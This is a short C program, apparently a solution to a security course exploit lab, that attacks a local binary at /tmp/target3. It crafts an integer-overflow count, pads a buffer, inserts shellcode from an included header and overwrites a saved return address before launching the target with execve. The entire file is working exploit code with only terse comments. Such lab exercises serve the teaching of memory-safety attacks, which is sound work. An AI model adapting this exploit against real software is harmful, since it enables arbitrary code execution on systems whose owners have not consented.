#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  // c.to_signed < 0
  // (c.to_signed * 20).to_unsigned = 20020
  // where 20 == sizeof(widget)
  char *count = "2147484649,";
  
  char sploit[11 + 20021];
  memset(sploit, 0xff, sizeof sploit);
  memcpy(sploit, count, 11);
  memcpy(sploit + 11, shellcode, sizeof shellcode - 1);
  int *eip = (int *) (sploit + 11 + 20004);
  *eip = 0xbfffb1c5;
  sploit[20020] = '\0';

  args[0] = TARGET; args[1] = sploit; args[2] = NULL;
  env[0] = NULL;
  

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
